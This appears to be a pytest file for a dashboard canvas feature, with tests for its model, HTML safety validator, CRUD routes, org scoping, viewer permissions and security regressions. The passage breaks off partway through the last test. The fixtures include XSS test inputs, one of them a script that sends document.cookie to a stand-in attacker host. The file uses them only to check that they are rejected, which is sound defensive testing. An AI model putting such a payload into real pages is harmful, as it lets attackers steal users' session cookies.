"""Tests for Canvas Wave 1: model, validation, CRUD, and collect_canvas_data.

Coverage
--------
1. CanvasDoc model round-trip
   a. Minimal doc (no bindings, no variables).
   b. Full doc (query + metric + api bindings, variables, assets).
   c. Discriminated binding coercion (kind dispatch).

2. validate_canvas_doc — HTML safety
   a. Rejects <script> tags.
   b. Rejects on*= inline event handlers.
   c. Rejects javascript: URI.
   d. Rejects unknown custom elements.
   e. Accepts all canonical nubi-* elements.
   f. Clean HTML → (True, []).

3. validate_canvas_doc — binding checks
   a. Orphan binding (el_id not in HTML) → [warn].
   b. Unbound element (data-el-id not in bindings) → [warn].
   c. At-most-one binding per element (model enforces this via dict keying).
   d. Unknown query_id → [warn].
   e. Valid doc with matching el_ids → no hard errors.

4. canvases CRUD (via routes + InMemoryRepo)
   a. POST /canvases → 201.
   b. GET /canvases → includes created canvas.
   c. GET /canvases/{id} → 200.
   d. PUT /canvases/{id} → updated fields reflected.
   e. DELETE /canvases/{id} → 204, then GET → 404.
   f. No token → 401.
   g. Cross-org: another user cannot GET/PUT/DELETE the canvas.

5. POST /canvas/validate — stateless oracle
   a. 401 without auth.
   b. Valid doc → 200, valid=True, no errors.
   c. Doc with <script> → valid=False, errors contain the issue.
   d. Doc with orphan binding → valid=True, warnings contain the issue.

6. collect_canvas_data
   a. Missing canvas → AppError("canvas_not_found").
   b. Query binding → runs run_query_rows, returns {el_id: {columns, rows}}.
   c. RLS / org-scoping: canvas from different org → canvas_not_found.
   d. Best-effort: unknown query_id → entry has "error" key, others succeed.
"""

from __future__ import annotations

import uuid
from typing import Any
from unittest.mock import AsyncMock, patch

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

from app.auth.jwt import mint_access_token
from app.dashboards.canvas import (
    ApiBinding,
    CanvasDoc,
    CanvasVariable,
    MetricBinding,
    QueryBinding,
    validate_canvas_doc,
)
from app.errors import AppError
from app.repos.memory import InMemoryRepo
from app.repos.provider import set_repo


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _auth_headers(user_id: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {mint_access_token(user_id)}"}


def _make_user(user_id: str) -> dict[str, Any]:
    return {
        "id": user_id,
        "email": "canvas-tester@example.com",
        "name": "Canvas Tester",
        "avatar_url": None,
        "email_verified": True,
        "created_at": "2024-01-01T00:00:00+00:00",
    }


def _good_doc_dict() -> dict[str, Any]:
    """Return a valid CanvasDoc dict with one query binding."""
    return {
        "version": 1,
        "title": "Test Canvas",
        "html": '<div><nubi-kpi data-el-id="el_1"></nubi-kpi></div>',
        "bindings": {
            "el_1": {"kind": "query", "query_id": "demo_all", "field": "id"},
        },
        "variables": [{"name": "region", "type": "select", "default": "US"}],
        "assets": {"css": ".canvas { color: red; }"},
    }


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest_asyncio.fixture
async def canvas_client(app, fake_db):
    """HTTPX async client with InMemoryRepo + seeded user + org."""
    repo = InMemoryRepo()
    set_repo(repo)

    user_id = str(uuid.uuid4())
    org_id = str(uuid.uuid4())
    fake_db.users[user_id] = _make_user(user_id)
    repo.seed_org_member(org_id=org_id, user_id=user_id)

    transport = ASGITransport(app=app)
    async with AsyncClient(
        transport=transport,
        base_url="http://testserver",
        follow_redirects=False,
    ) as ac:
        yield ac, user_id, org_id, repo

    set_repo(None)


# ---------------------------------------------------------------------------
# 1. CanvasDoc model round-trip
# ---------------------------------------------------------------------------


class TestCanvasDocModel:
    """CanvasDoc Pydantic model round-trip and binding coercion."""

    def test_minimal_doc_parses(self):
        doc = CanvasDoc.model_validate({"version": 1, "title": "Empty", "html": "<p></p>"})
        assert doc.version == 1
        assert doc.title == "Empty"
        assert doc.bindings == {}
        assert doc.variables == []

    def test_defaults_populated(self):
        doc = CanvasDoc.model_validate({})
        assert doc.version == 1
        assert doc.html == ""
        assert doc.bindings == {}
        assert doc.assets == {}
        assert doc.variables == []

    def test_query_binding_coerced(self):
        doc = CanvasDoc.model_validate(_good_doc_dict())
        assert "el_1" in doc.bindings
        b = doc.bindings["el_1"]
        assert isinstance(b, QueryBinding)
        assert b.query_id == "demo_all"
        assert b.field == "id"

    def test_metric_binding_coerced(self):
        data = {
            "html": '<nubi-metric data-el-id="m1"></nubi-metric>',
            "bindings": {
                "m1": {"kind": "metric", "metric_id": "rev_total", "time_grain": "month"},
            },
        }
        doc = CanvasDoc.model_validate(data)
        b = doc.bindings["m1"]
        assert isinstance(b, MetricBinding)
        assert b.metric_id == "rev_total"
        assert b.time_grain == "month"

    def test_api_binding_coerced(self):
        data = {
            "html": '<nubi-value data-el-id="a1"></nubi-value>',
            "bindings": {
                "a1": {
                    "kind": "api",
                    "connector_id": "some-connector-uuid",
                    "path": "/v1/data",
                    "select": "$.value",
                },
            },
        }
        doc = CanvasDoc.model_validate(data)
        b = doc.bindings["a1"]
        assert isinstance(b, ApiBinding)
        assert b.connector_id == "some-connector-uuid"
        assert b.path == "/v1/data"
        assert b.select == "$.value"

    def test_model_dump_round_trips(self):
        doc = CanvasDoc.model_validate(_good_doc_dict())
        dumped = doc.model_dump()
        doc2 = CanvasDoc.model_validate(dumped)
        assert doc.title == doc2.title
        assert set(doc.bindings.keys()) == set(doc2.bindings.keys())

    def test_variables_parsed(self):
        doc = CanvasDoc.model_validate(_good_doc_dict())
        assert len(doc.variables) == 1
        v = doc.variables[0]
        assert isinstance(v, CanvasVariable)
        assert v.name == "region"
        assert v.type == "select"
        assert v.default == "US"

    def test_full_doc_parses(self):
        data = {
            "version": 1,
            "title": "Full Canvas",
            "html": (
                '<section>'
                '<nubi-kpi data-el-id="k1"></nubi-kpi>'
                '<nubi-table data-el-id="t1"></nubi-table>'
                '<nubi-value data-el-id="v1"></nubi-value>'
                '</section>'
            ),
            "bindings": {
                "k1": {"kind": "query", "query_id": "demo_all"},
                "t1": {"kind": "query", "query_id": "demo_all"},
                "v1": {"kind": "api", "connector_id": "c1", "path": "/"},
            },
            "variables": [{"name": "period", "type": "date", "default": None}],
            "assets": {"css": "body { margin: 0; }"},
            "theme": {"accent": "#0af"},
        }
        doc = CanvasDoc.model_validate(data)
        assert len(doc.bindings) == 3
        assert isinstance(doc.bindings["k1"], QueryBinding)
        assert isinstance(doc.bindings["v1"], ApiBinding)
        assert doc.theme == {"accent": "#0af"}


# ---------------------------------------------------------------------------
# 2. validate_canvas_doc — HTML safety
# ---------------------------------------------------------------------------


class TestValidateCanvasDocHtmlSafety:
    """validate_canvas_doc rejects forbidden HTML constructs."""

    def test_rejects_script_tag(self):
        doc = CanvasDoc.model_validate(
            {"html": '<div><script>alert(1)</script></div>', "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False
        assert any("script" in i.lower() for i in issues), issues

    def test_rejects_on_handler(self):
        doc = CanvasDoc.model_validate(
            {"html": '<button onclick="alert(1)">click</button>', "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False
        assert any("on*=" in i or "inline event handler" in i.lower() for i in issues), issues

    def test_rejects_javascript_uri(self):
        doc = CanvasDoc.model_validate(
            {"html": '<a href="javascript:void(0)">link</a>', "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False
        assert any("javascript:" in i for i in issues), issues

    def test_rejects_unknown_custom_element(self):
        doc = CanvasDoc.model_validate(
            {"html": '<x-unknown-element></x-unknown-element>', "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False
        assert any("unknown custom element" in i.lower() for i in issues), issues

    def test_accepts_all_canonical_nubi_elements(self):
        html = (
            '<div>'
            '<nubi-kpi data-el-id="e1"></nubi-kpi>'
            '<nubi-table data-el-id="e2"></nubi-table>'
            '<nubi-chart data-el-id="e3"></nubi-chart>'
            '<nubi-metric data-el-id="e4"></nubi-metric>'
            '<nubi-filter data-el-id="e5"></nubi-filter>'
            '<nubi-text data-el-id="e6"></nubi-text>'
            '<nubi-value data-el-id="e7"></nubi-value>'
            '</div>'
        )
        doc = CanvasDoc.model_validate({"html": html, "bindings": {}})
        ok, issues = validate_canvas_doc(doc)
        hard_issues = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard_issues == [], f"Unexpected hard issues: {hard_issues}"

    def test_clean_html_returns_true_no_hard_errors(self):
        doc = CanvasDoc.model_validate(
            {"html": "<div><p>Hello world</p></div>", "bindings": {}}
        )
        ok, issues = validate_canvas_doc(doc)
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Expected no hard errors, got: {hard}"


# ---------------------------------------------------------------------------
# 3. validate_canvas_doc — binding checks
# ---------------------------------------------------------------------------


class TestValidateCanvasDocBindings:
    """validate_canvas_doc checks binding ↔ HTML element consistency."""

    def test_orphan_binding_is_warning(self):
        """Binding with el_id absent from HTML → [warn], not hard error."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",  # no data-el-id
                "bindings": {
                    "orphan_el": {"kind": "query", "query_id": "demo_all"},
                },
            }
        )
        ok, issues = validate_canvas_doc(doc)
        # Hard errors only for the orphan? No — the orphan is a [warn].
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Orphan binding should only warn, got hard: {hard}"
        warns = [i for i in issues if i.lstrip().lower().startswith("[warn]")]
        assert any("orphan_el" in i for i in warns), warns

    def test_unbound_element_is_warning(self):
        """data-el-id in HTML with no binding → [warn]."""
        doc = CanvasDoc.model_validate(
            {
                "html": '<nubi-kpi data-el-id="unbound_kpi"></nubi-kpi>',
                "bindings": {},
            }
        )
        _ok, issues = validate_canvas_doc(doc)
        warns = [i for i in issues if i.lstrip().lower().startswith("[warn]")]
        assert any("unbound_kpi" in i for i in warns), warns

    def test_at_most_one_binding_per_el_is_trivially_enforced(self):
        """The bindings dict can only have one value per el_id (dict keys unique)."""
        # Pydantic models dict → only the last key wins for duplicate keys in JSON.
        # We verify that the model correctly stores only one binding per el_id.
        data = {
            "html": '<nubi-kpi data-el-id="el_1"></nubi-kpi>',
            "bindings": {"el_1": {"kind": "query", "query_id": "demo_all"}},
        }
        doc = CanvasDoc.model_validate(data)
        assert len(doc.bindings) == 1
        assert "el_1" in doc.bindings

    def test_unknown_query_id_is_warning(self):
        """Binding referencing a non-registered query_id → [warn]."""
        doc = CanvasDoc.model_validate(
            {
                "html": '<nubi-kpi data-el-id="el_1"></nubi-kpi>',
                "bindings": {
                    "el_1": {"kind": "query", "query_id": "does_not_exist_xyz_12345"},
                },
            }
        )
        _ok, issues = validate_canvas_doc(doc)
        warns = [i for i in issues if i.lstrip().lower().startswith("[warn]")]
        assert any("does_not_exist_xyz_12345" in i for i in warns), warns

    def test_matching_el_ids_no_hard_errors(self):
        """Doc where all el_ids match bindings ↔ HTML → no hard errors."""
        doc = CanvasDoc.model_validate(_good_doc_dict())
        ok, issues = validate_canvas_doc(doc)
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Expected no hard errors for good doc: {hard}"

    def test_multiple_bindings_with_some_orphans(self):
        """Multiple bindings: orphans warn, bound ones succeed."""
        doc = CanvasDoc.model_validate(
            {
                "html": '<nubi-kpi data-el-id="real_el"></nubi-kpi>',
                "bindings": {
                    "real_el": {"kind": "query", "query_id": "demo_all"},
                    "ghost_el": {"kind": "query", "query_id": "demo_all"},
                },
            }
        )
        _ok, issues = validate_canvas_doc(doc)
        warns = [i for i in issues if i.lstrip().lower().startswith("[warn]")]
        assert any("ghost_el" in i for i in warns), warns
        # real_el should not appear in any orphan warning
        assert not any("real_el" in i and "no matching" in i.lower() for i in warns)


# ---------------------------------------------------------------------------
# 4. canvases CRUD (via routes + InMemoryRepo)
# ---------------------------------------------------------------------------


class TestCanvasesCrud:
    """Happy-path CRUD tests for the /canvases routes."""

    @pytest.mark.asyncio
    async def test_create_returns_201(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        resp = await client.post(
            "/api/v1/canvases",
            json={"name": "My Canvas", "config": {"doc": {"version": 1, "title": "X"}}},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 201, resp.text
        body = resp.json()
        assert body["name"] == "My Canvas"
        assert "id" in body
        assert body["org_id"] == org_id
        assert body["created_by"] == user_id

    @pytest.mark.asyncio
    async def test_list_shows_created_canvas(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Listed Canvas"},
            headers=_auth_headers(user_id),
        )
        assert create_resp.status_code == 201

        list_resp = await client.get(
            "/api/v1/canvases",
            headers=_auth_headers(user_id),
        )
        assert list_resp.status_code == 200
        canvases = list_resp.json()
        assert isinstance(canvases, list)
        names = [c["name"] for c in canvases]
        assert "Listed Canvas" in names

    @pytest.mark.asyncio
    async def test_get_returns_200(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Gettable Canvas"},
            headers=_auth_headers(user_id),
        )
        canvas_id = create_resp.json()["id"]

        get_resp = await client.get(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(user_id),
        )
        assert get_resp.status_code == 200
        assert get_resp.json()["id"] == canvas_id
        assert get_resp.json()["name"] == "Gettable Canvas"

    @pytest.mark.asyncio
    async def test_update_reflects_change(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Old Name", "config": {"v": 1}},
            headers=_auth_headers(user_id),
        )
        canvas_id = create_resp.json()["id"]

        update_resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"name": "New Name", "config": {"v": 2}},
            headers=_auth_headers(user_id),
        )
        assert update_resp.status_code == 200
        updated = update_resp.json()
        assert updated["name"] == "New Name"
        assert updated["config"] == {"v": 2}

    @pytest.mark.asyncio
    async def test_delete_then_get_returns_404(self, canvas_client):
        client, user_id, org_id, _repo = canvas_client
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Deletable Canvas"},
            headers=_auth_headers(user_id),
        )
        canvas_id = create_resp.json()["id"]

        del_resp = await client.delete(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(user_id),
        )
        assert del_resp.status_code == 204

        get_resp = await client.get(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(user_id),
        )
        assert get_resp.status_code == 404

    @pytest.mark.asyncio
    async def test_no_token_returns_401(self, canvas_client):
        client, _user_id, _org_id, _repo = canvas_client
        resp = await client.get("/api/v1/canvases")
        assert resp.status_code == 401

    @pytest.mark.asyncio
    async def test_cross_org_cannot_get(self, canvas_client, fake_db):
        """A user from a different org cannot GET another org's canvas."""
        client, alice_id, alice_org_id, repo = canvas_client

        # Create a canvas as Alice.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Alice's Canvas"},
            headers=_auth_headers(alice_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        # Create Bob in a different org.
        bob_id = str(uuid.uuid4())
        bob_org_id = str(uuid.uuid4())
        fake_db.users[bob_id] = _make_user(bob_id)
        repo.seed_org_member(org_id=bob_org_id, user_id=bob_id)

        get_resp = await client.get(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(bob_id),
        )
        # Bob must get 404 (not 403 — no info leak).
        assert get_resp.status_code == 404


# ---------------------------------------------------------------------------
# 5. POST /canvas/validate — stateless oracle
# ---------------------------------------------------------------------------


class TestCanvasValidateEndpoint:
    """POST /canvas/validate endpoint behaviour."""

    @pytest.mark.asyncio
    async def test_requires_auth(self, canvas_client):
        client, _user_id, _org_id, _repo = canvas_client
        resp = await client.post(
            "/api/v1/canvas/validate",
            json={"doc": _good_doc_dict()},
        )
        assert resp.status_code == 401

    @pytest.mark.asyncio
    async def test_valid_doc_returns_valid_true(self, canvas_client):
        client, user_id, _org_id, _repo = canvas_client
        resp = await client.post(
            "/api/v1/canvas/validate",
            json={"doc": _good_doc_dict()},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 200
        body = resp.json()
        # Hard errors (non-warn issues) should be absent.
        assert body["errors"] == [], f"Expected no hard errors, got: {body['errors']}"

    @pytest.mark.asyncio
    async def test_script_tag_returns_invalid(self, canvas_client):
        client, user_id, _org_id, _repo = canvas_client
        bad_doc = {
            "version": 1,
            "title": "XSS",
            "html": "<script>alert(1)</script>",
            "bindings": {},
        }
        resp = await client.post(
            "/api/v1/canvas/validate",
            json={"doc": bad_doc},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 200
        body = resp.json()
        assert body["valid"] is False
        assert len(body["errors"]) > 0
        assert any("script" in e.lower() for e in body["errors"])

    @pytest.mark.asyncio
    async def test_orphan_binding_in_warnings(self, canvas_client):
        """Orphan binding (el_id not in HTML) → valid=True, warning present."""
        client, user_id, _org_id, _repo = canvas_client
        doc_with_orphan = {
            "version": 1,
            "title": "Orphan Test",
            "html": "<div><p>No data-el-id here</p></div>",
            "bindings": {
                "orphan_id": {"kind": "query", "query_id": "demo_all"},
            },
        }
        resp = await client.post(
            "/api/v1/canvas/validate",
            json={"doc": doc_with_orphan},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 200
        body = resp.json()
        assert body["valid"] is True, f"Orphan should only warn: {body['errors']}"
        assert len(body["warnings"]) > 0
        assert any("orphan_id" in w for w in body["warnings"])


# ---------------------------------------------------------------------------
# 6. collect_canvas_data
# ---------------------------------------------------------------------------


class TestCollectCanvasData:
    """collect_canvas_data: org-scoping, RLS, best-effort collection."""

    @pytest.mark.asyncio
    async def test_missing_canvas_raises(self):
        """Unknown canvas_id → AppError("canvas_not_found")."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())

        with pytest.raises(AppError) as exc_info:
            await collect_canvas_data(
                canvas_id=str(uuid.uuid4()),
                org_id=org_id,
                claims={},
                repo=repo,
            )
        assert exc_info.value.code == "canvas_not_found"

    @pytest.mark.asyncio
    async def test_cross_org_canvas_raises(self):
        """Canvas belonging to a different org → canvas_not_found."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_a = str(uuid.uuid4())
        org_b = str(uuid.uuid4())
        user_a = str(uuid.uuid4())
        user_b = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_a, user_id=user_a)
        repo.seed_org_member(org_id=org_b, user_id=user_b)

        # Create canvas in org_a.
        canvas = await repo.create(
            "canvases",
            org_id=org_a,
            created_by=user_a,
            name="Org A Canvas",
            config={"doc": {"version": 1, "html": "", "bindings": {}}},
        )
        canvas_id = canvas["id"]

        # org_b cannot access org_a's canvas.
        with pytest.raises(AppError) as exc_info:
            await collect_canvas_data(
                canvas_id=canvas_id,
                org_id=org_b,
                claims={},
                repo=repo,
            )
        assert exc_info.value.code == "canvas_not_found"

    @pytest.mark.asyncio
    async def test_query_binding_calls_run_query_rows(self):
        """Query binding → run_query_rows called; result returned under el_id."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Q Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-kpi data-el-id="el_1"></nubi-kpi>',
                    "bindings": {
                        "el_1": {"kind": "query", "query_id": "demo_all"},
                    },
                }
            },
        )

        # Patch run_query_rows so we don't need a live DuckDB session.
        mock_rows = (["id", "name"], [[1, "Alice"]])
        with patch(
            "app.dashboards.collect.run_query_rows",
            new=AsyncMock(return_value=mock_rows),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas["id"],
                org_id=org_id,
                claims={},
                repo=repo,
            )

        assert "el_1" in result
        assert result["el_1"]["columns"] == ["id", "name"]
        assert result["el_1"]["rows"] == [[1, "Alice"]]

    @pytest.mark.asyncio
    async def test_unknown_query_id_returns_error_key(self):
        """Unknown query_id → entry has 'error' key, not a hard exception."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Bad Q Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-kpi data-el-id="el_bad"></nubi-kpi>',
                    "bindings": {
                        "el_bad": {"kind": "query", "query_id": "nonexistent_xyz_9999"},
                    },
                }
            },
        )

        result = await collect_canvas_data(
            canvas_id=canvas["id"],
            org_id=org_id,
            claims={},
            repo=repo,
        )

        assert "el_bad" in result
        assert "error" in result["el_bad"], f"Expected error key, got: {result['el_bad']}"

    @pytest.mark.asyncio
    async def test_empty_bindings_returns_empty_dict(self):
        """Canvas with no bindings → empty result dict."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Empty Canvas",
            config={"doc": {"version": 1, "html": "<p>hello</p>", "bindings": {}}},
        )

        result = await collect_canvas_data(
            canvas_id=canvas["id"],
            org_id=org_id,
            claims={},
            repo=repo,
        )
        assert result == {}

    @pytest.mark.asyncio
    async def test_prefetched_canvas_skips_repo_lookup(self):
        """Pre-fetching the canvas row avoids the repo.get call."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        canvas_row = {
            "id": str(uuid.uuid4()),
            "org_id": org_id,
            "name": "Prefetched",
            "config": {"doc": {"version": 1, "html": "<div></div>", "bindings": {}}},
        }

        # Pass pre-fetched canvas; if repo.get were called it would return None
        # (canvas not in store) and raise — this verifies the bypass.
        result = await collect_canvas_data(
            canvas_id=canvas_row["id"],
            org_id=org_id,
            claims={},
            repo=repo,
            canvas=canvas_row,
        )
        assert result == {}


# ---------------------------------------------------------------------------
# 7. Security regression tests
# ---------------------------------------------------------------------------


@pytest_asyncio.fixture
async def canvas_client_with_viewer(app, fake_db):
    """HTTPX async client with a member user + a viewer user, both in separate orgs."""
    repo = InMemoryRepo()
    set_repo(repo)

    # Owner/member user
    owner_id = str(uuid.uuid4())
    owner_org_id = str(uuid.uuid4())
    fake_db.users[owner_id] = {
        "id": owner_id,
        "email": "owner@example.com",
        "name": "Owner",
        "avatar_url": None,
        "email_verified": True,
        "created_at": "2024-01-01T00:00:00+00:00",
    }
    repo.seed_org_member(org_id=owner_org_id, user_id=owner_id, role="owner")

    # Viewer user in their own org
    viewer_id = str(uuid.uuid4())
    viewer_org_id = str(uuid.uuid4())
    fake_db.users[viewer_id] = {
        "id": viewer_id,
        "email": "viewer@example.com",
        "name": "Viewer",
        "avatar_url": None,
        "email_verified": True,
        "created_at": "2024-01-01T00:00:00+00:00",
    }
    repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="viewer")

    transport = ASGITransport(app=app)
    async with AsyncClient(
        transport=transport,
        base_url="http://testserver",
        follow_redirects=False,
    ) as ac:
        yield ac, owner_id, owner_org_id, viewer_id, viewer_org_id, repo

    set_repo(None)


class TestCanvasSecurityRegressions:
    """Regression tests for the three confirmed security findings.

    Finding 1 (CRITICAL RLS): schedule endpoint must snapshot owner policies.
    Finding 2 (MED RBAC):     viewer is 403 on create/update/delete/schedule.
    Finding 3 (MED safety):   PUT rejects HTML with a <script> tag.
    """

    # ── Finding 1: Schedule snapshots owner policies ─────────────────────────

    @pytest.mark.asyncio
    async def test_schedule_snapshots_owner_policies_onto_flow_spec(
        self, canvas_client_with_viewer, fake_db
    ):
        """POST /canvases/{id}/schedule stores __owner_policies__ in flow spec.

        Regression for CRITICAL RLS finding: without this snapshot the scheduled
        report_send would render with claims=None → all tenant rows leak to
        recipients. The snapshot is read back from the flow store after creation.
        """
        from app.flows.store import get_flow_store
        from app.routes.flows import OWNER_POLICIES_KEY

        client, owner_id, _owner_org, *_ = canvas_client_with_viewer

        # Create a canvas first.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Scheduled Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201, create_resp.text
        canvas_id = create_resp.json()["id"]

        # Schedule the canvas.
        sched_resp = await client.post(
            f"/api/v1/canvases/{canvas_id}/schedule",
            json={"recipients": ["alice@example.com"], "format": "html"},
            headers=_auth_headers(owner_id),
        )
        assert sched_resp.status_code == 201, sched_resp.text
        flow_id = sched_resp.json()["flow_id"]

        # The persisted flow spec MUST have runtime_config[OWNER_POLICIES_KEY].
        store = get_flow_store()
        flow = await store.get_flow(flow_id)
        assert flow is not None, "Flow not found in store."
        spec = flow.get("spec") or {}
        runtime_config = spec.get("runtime_config") or {}
        assert OWNER_POLICIES_KEY in runtime_config, (
            f"__owner_policies__ missing from flow spec runtime_config. "
            f"spec keys: {list(spec.keys())}, runtime_config: {runtime_config}"
        )
        # The snapshot value must be a dict (even if empty for an unscoped owner).
        assert isinstance(runtime_config[OWNER_POLICIES_KEY], dict)

    # ── Finding 2: Viewer is 403 on all mutating endpoints ───────────────────

    @pytest.mark.asyncio
    async def test_viewer_cannot_create_canvas(self, canvas_client_with_viewer):
        """Viewer role is forbidden (403) from POST /canvases."""
        client, _owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer

        resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Viewer Canvas"},
            headers=_auth_headers(viewer_id),
        )
        assert resp.status_code == 403, resp.text

    @pytest.mark.asyncio
    async def test_viewer_cannot_update_canvas(self, canvas_client_with_viewer, fake_db):
        """Viewer role is forbidden (403) from PUT /canvases/{id}."""
        client, owner_id, _owner_org, viewer_id, viewer_org_id, repo = canvas_client_with_viewer

        # Create a canvas as the owner.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Owner Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        # Viewer cannot update (even their own org — viewer_org has no canvas here,
        # but the 403 fires before the 404 because the writer guard runs first).
        resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"name": "Hijacked Name"},
            headers=_auth_headers(viewer_id),
        )
        assert resp.status_code == 403, resp.text

    @pytest.mark.asyncio
    async def test_viewer_cannot_delete_canvas(self, canvas_client_with_viewer):
        """Viewer role is forbidden (403) from DELETE /canvases/{id}."""
        client, owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer

        # Create a canvas as the owner.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Owner Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        resp = await client.delete(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(viewer_id),
        )
        assert resp.status_code == 403, resp.text

    @pytest.mark.asyncio
    async def test_viewer_cannot_schedule_canvas(self, canvas_client_with_viewer):
        """Viewer role is forbidden (403) from POST /canvases/{id}/schedule."""
        client, owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer

        # Create a canvas as the owner.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Owner Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        resp = await client.post(
            f"/api/v1/canvases/{canvas_id}/schedule",
            json={"recipients": ["viewer@example.com"]},
            headers=_auth_headers(viewer_id),
        )
        assert resp.status_code == 403, resp.text

    @pytest.mark.asyncio
    async def test_viewer_can_still_get_canvas(self, canvas_client_with_viewer, fake_db):
        """GET endpoints remain accessible to viewers (read-only is fine).

        We create a canvas as the viewer (by temporarily granting owner role) then
        downgrade to viewer to assert they can still list/get. This avoids the
        org-resolution ambiguity of seeding a user into multiple orgs.
        """
        client, _owner_id, _owner_org, viewer_id, viewer_org_id, repo = canvas_client_with_viewer

        # Temporarily grant owner so the create succeeds.
        repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="owner")

        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Readable Canvas"},
            headers=_auth_headers(viewer_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        # Downgrade back to viewer.
        repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="viewer")

        # Viewer can GET the canvas list and the specific canvas.
        list_resp = await client.get("/api/v1/canvases", headers=_auth_headers(viewer_id))
        assert list_resp.status_code == 200

        get_resp = await client.get(
            f"/api/v1/canvases/{canvas_id}", headers=_auth_headers(viewer_id)
        )
        assert get_resp.status_code == 200

    # ── Finding 3: PUT rejects docs with script tags ─────────────────────────

    @pytest.mark.asyncio
    async def test_put_rejects_doc_with_script_tag(self, canvas_client_with_viewer):
        """PUT /canvases/{id} must 400 when config.doc contains a <script> tag.

        Regression for MED safety finding: without this check a writer can
        store XSS payloads in the canvas config that are later rendered.
        """
        client, owner_id, *_ = canvas_client_with_viewer

        # Create a clean canvas first.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Safe Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201, create_resp.text
        canvas_id = create_resp.json()["id"]

        # Attempt to update with a doc containing a <script> tag.
        xss_doc = {
            "version": 1,
            "title": "XSS attempt",
            "html": '<div><script>fetch("https://evil.example/steal?c="+document.cookie)</script></div>',
            "bindings": {},
        }
        resp = await client.put(
